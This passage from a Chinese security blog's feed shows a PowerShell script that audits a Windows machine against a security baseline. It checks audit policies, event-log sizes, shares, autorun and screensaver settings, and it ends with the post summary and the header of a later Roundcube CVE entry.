class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核特权使用策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核特权使用策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">#审核系统事件</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditSystemEvents &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核系统事件策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核系统事件策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">#审核账户登录事件</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditAccountLogon &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核账户登录事件策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核账户登录事件策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#审核账户管理</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditAccountManage &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核账户管理策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核账户管理策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#暂停会话前所需的空闲时间</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\AutoDisconnect&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config_line</span>[<span class="number">1</span>]</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;,&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-le</span> <span class="string">&quot;30&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;暂停会话前所需的空闲时间策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;暂停会话前所需的空闲时间策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#应用日志查看器大小设置</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;MaxSize&quot;</span></span><br><span class="line"><span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-ge</span> <span class="string">&quot;8388608&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;应用日志查看器大小设置策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;应用日志查看器大小设置策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#系统日志查看器大小设置</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\System&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;MaxSize&quot;</span></span><br><span class="line"><span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-ge</span> <span class="string">&quot;8388608&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;系统日志查看器大小设置策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;系统日志查看器大小设置策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#安全日志查看器大小设置</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Security&#x27;</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;MaxSize&quot;</span></span><br><span class="line"><span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-ge</span> <span class="string">&quot;8388608&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;安全日志查看器大小设置策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;安全日志查看器大小设置策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#检测防护软件</span></span><br><span class="line"><span class="comment">#无防护软件标准,最好使用人工查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#是否启用NTP服务同步时钟</span></span><br><span class="line"><span class="comment">#$Key = &#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer&#x27;</span></span><br><span class="line"><span class="comment">#$Name = &#x27;Enabled&#x27;</span></span><br><span class="line"><span class="comment"># $config = (Get-ItemProperty -Path &quot;Registry::$Key&quot; -ErrorAction Stop).$Name</span></span><br><span class="line"><span class="comment">#   if($config -eq &quot;1&quot;)</span></span><br><span class="line"><span class="comment">#        &#123;</span></span><br><span class="line"><span class="comment">#            $data.code = &quot;1&quot;</span></span><br><span class="line"><span class="comment">#            $projectdata = @&#123;&quot;msg&quot;=&quot;启用NTP服务同步时钟策略符合标准&quot;;&#125;</span></span><br><span class="line"><span class="comment">#            $data[&#x27;project&#x27;]+=$projectdata</span></span><br><span class="line"><span class="comment">#        &#125;</span></span><br><span class="line"><span class="comment">#        else</span></span><br><span class="line"><span class="comment">#        &#123;</span></span><br><span class="line"><span class="comment">#            $data.code = &quot;0&quot;</span></span><br><span class="line"><span class="comment">#            $projectdata = @&#123;&quot;msg&quot;=&quot;启用NTP服务同步时钟策略不符合标准&quot;;&#125;</span></span><br><span class="line"><span class="comment">#            $data[&#x27;project&#x27;]+=$projectdata</span></span><br><span class="line"><span class="comment">#        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检测开机启动项</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#x27;</span></span><br><span class="line"><span class="variable">$result</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop)</span><br><span class="line"><span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;开机启动项为：<span class="variable">$</span>(<span class="variable">$result</span>)&quot;</span>;&#125;</span><br><span class="line"> <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#检查关闭IPC$共享</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&#x27;</span></span><br><span class="line"> <span class="variable">$Name</span> = <span class="string">&#x27;restrictanonymous&#x27;</span></span><br><span class="line"> <span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$Name</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-eq</span> <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;关闭IPC`$共享策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;关闭IPC`$共享策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">#检查关闭默认共享</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters&#x27;</span></span><br><span class="line"> <span class="variable">$Name</span> = <span class="string">&#x27;AutoShareServer&#x27;</span></span><br><span class="line"> <span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$Name</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-eq</span> <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;关闭默认共享策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">          <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;关闭默认共享策略不符合标准&quot;</span>;&#125;</span><br><span class="line">          <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#禁止全部驱动器自动播放</span></span><br><span class="line"> <span class="variable">$Key</span> = <span class="string">&#x27;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&#x27;</span></span><br><span class="line"> <span class="variable">$name</span> = <span class="string">&quot;NoDriveTypeAutoRun&quot;</span></span><br><span class="line"> <span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-eq</span> <span class="string">&quot;255&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;禁止全部驱动器自动播放符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;禁止全部驱动器自动播放不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#屏幕自动保护程序</span></span><br><span class="line"><span class="comment">#$Key = &#x27;HKEY_CURRENT_USER\Control Panel\Desktop&#x27;</span></span><br><span class="line"><span class="comment">#$name = &quot;ScreenSaveActive&quot;</span></span><br><span class="line"><span class="comment">#$config = (Get-ItemProperty -Path &quot;Registry::$Key&quot; -ErrorAction Stop).$name</span></span><br><span class="line"><span class="comment">#if($config -eq &quot;1&quot;)</span></span><br><span class="line"><span class="comment">#        &#123;</span></span><br><span class="line"><span class="comment">#           $data.code = &quot;1&quot;</span></span><br><span class="line"><span class="comment">#           $projectdata = @&#123;&quot;msg&quot;=&quot;屏幕自动保护程序策略符合标准&quot;;&#125;</span></span><br><span class="line"><span class="comment">#           $data[&#x27;project&#x27;]+=$projectdata</span></span><br><span class="line"><span class="comment">#        &#125;</span></span><br><span class="line"><span class="comment">#        else</span></span><br><span class="line"><span class="comment">#        &#123;</span></span><br><span class="line"><span class="comment">#            $data.code = &quot;0&quot;</span></span><br><span class="line"><span class="comment">#            $projectdata = @&#123;&quot;msg&quot;=&quot;屏幕自动保护程序策略不符合标准&quot;;&#125;</span></span><br><span class="line"><span class="comment">#            $data[&#x27;project&#x27;]+=$projectdata</span></span><br><span class="line"><span class="comment">#        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#屏幕保护程序启动时间</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_CURRENT_USER\Control Panel\Desktop&#x27;</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;ScreenSaveTimeOut&quot;</span></span><br><span class="line"><span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-le</span> <span class="string">&quot;600&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;屏幕保护程序启动时间策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;屏幕保护程序启动时间策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#屏幕恢复时使用密码保护</span></span><br><span class="line"><span class="variable">$Key</span> = <span class="string">&#x27;HKEY_CURRENT_USER\Control Panel\Desktop&#x27;</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;ScreenSaverIsSecure&quot;</span></span><br><span class="line"><span class="variable">$config</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;Registry::<span class="variable">$Key</span>&quot;</span> <span class="literal">-ErrorAction</span> Stop).<span class="variable">$name</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span> <span class="operator">-ge</span> <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;屏幕恢复时使用密码保护策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;屏幕恢复时使用密码保护策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#结果处理</span></span><br><span class="line"><span class="variable">$date</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$date</span> &gt;&gt;windowsResult.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#$result = &quot;&quot;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$data</span>.project)&#123;</span><br><span class="line">    <span class="comment">#$result += &quot;&#123;&#x27;msg&#x27;:$($i.msg)&#125;,&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;&#x27;msg&#x27;:[<span class="variable">$</span>(<span class="variable">$i</span>.msg)]&#125;&quot;</span></span><br><span class="line"><span class="variable">$i</span>.msg &gt;&gt;windowsResult.txt</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>参考:</strong><a href="https://github.com/Echox1/windows_baseline">https://github.com/Echox1/windows_baseline</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;近期做基线检查，参考已有的基线脚本，二次修改使其符合windows基线Excel，并对代码中对细小错误进行了修改。&lt;/p&gt;
&lt;p&gt;重新制作了windows安全基线Excel以及powershell脚本，并在gitub上传了文件&lt;/p&gt;
&lt;p&gt;文件地址：&lt;a href=&quot;https://github.com/zeringzxh/windows_baseline&quot;&gt;https://github.com/zeringzxh/windows_baseline&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="企业安全建设" scheme="https://fl4g.cn/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="基线" scheme="https://fl4g.cn/tags/%E5%9F%BA%E7%BA%BF/"/>
    
  </entry>
  
  <entry>
    <title>(CVE-2017-16651)Roundcube Webmail文件读取漏洞</title>
    <link href="https://fl4g.cn/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://fl4g.cn/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-22T05:58:31.000Z</published>
    <updated>2021-03-22T06:06:07.021Z</updated>
    
